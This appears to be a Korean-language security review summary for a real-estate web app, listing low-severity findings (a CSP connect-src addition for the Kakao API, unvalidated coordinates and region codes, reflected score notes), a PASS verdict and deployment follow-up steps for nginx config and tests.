| ID | 심각도 | 제목 | 차단 |
|---|:--:|---|:--:|
| `SR21-1` | — (조치) | **CSP `connect-src` 에 `https://dapi.kakao.com` 추가** — services.js가 XHR임을 원본으로 확정. 미추가 시 기능 100% 불가 | 배포 시 반영 |
| `SR21-2` | low | 사용자 `weights` 키가 `score_notes`/`notes` 로 반사되어 **평문 컬럼에 영속·렌더**. XSS는 아님(React 이스케이프·IDOR 보호·1MB 상한) | 비차단 |
| `SR21-3` | info | 장소 검색 좌표에 **위경도 범위 검증 없음**(유한수면 통과) | 비차단 |
| `SR21-4` | info | `region_codes` 항목 패턴 미검증 — 인젝션은 불성립이나 `%` 로 지역 선택이 무력화됨 | 비차단 |
| `SR19-1` | medium(유지) | 카카오 JS 키 도메인 허용목록 미반영 — **CSP를 고쳐도 장소 검색이 401일 수 있다**(§1-D) | 비차단 |

### 판정

**PASS — 배포를 막을 보안 사유 없음.**

이번 변경의 보안 표면 증가는 **CSP `connect-src` 한 항목**뿐이고, 그 대상은 이미 `script-src` 로
더 센 권한을 준 동일 출처다. 새 코드(`scoring.py`)는 자산을 구조적으로 모르고, 변이로 그물도 확인했다.
프론트는 대량 변경에도 XSS 싱크 0·저장소 사용 0을 유지했다.

**배포 시 함께 할 것**
1. `deploy/nginx-realestate.conf` 의 `map $host $re_csp` 값에서 `connect-src 'self'` →
   **`connect-src 'self' https://dapi.kakao.com`** (§1-C 전체 값 참조).
2. `test_deploy_config.py` 의 `connect-src` 단언 갱신 — 이 참에 **정확 집합 단언**으로(SR19-2 해소).
3. 배포 후 장소 검색을 실브라우저로 1회 확인. **401이면 CSP를 더 풀지 말고** 카카오 콘솔 도메인 등록을 볼 것(§1-D).
